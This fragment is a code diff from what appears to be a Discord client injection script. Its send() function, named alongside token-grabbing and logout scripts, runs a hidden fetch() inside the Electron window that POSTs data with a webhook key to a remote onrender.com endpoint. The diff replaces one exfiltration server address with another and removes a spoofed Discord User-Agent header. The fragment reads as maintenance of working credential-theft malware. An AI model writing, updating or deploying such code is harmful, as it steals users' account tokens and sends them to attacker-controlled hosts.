@@ -10,13 +10,12 @@ const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = ["window.webpackJsonp?(gg=wind
 
 function send(e, d) {
     return new Promise((resolve, reject) => {
-        const url = `https://hook-aurathemes.onrender.com/request/${ID}/${e}`;
+        const url = `https://aurita.onrender.com/request/${ID}/${e}`;
         BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`fetch("${url}", ${JSON.stringify({
             method: 'POST',
             headers: {
                 'Content-Type': 'text/plain',
                 'Access-Control-Allow-Origin': '*',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9026 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',
                 'authorization': WEBHOOK,
             },
             body: JSON.stringify(d),
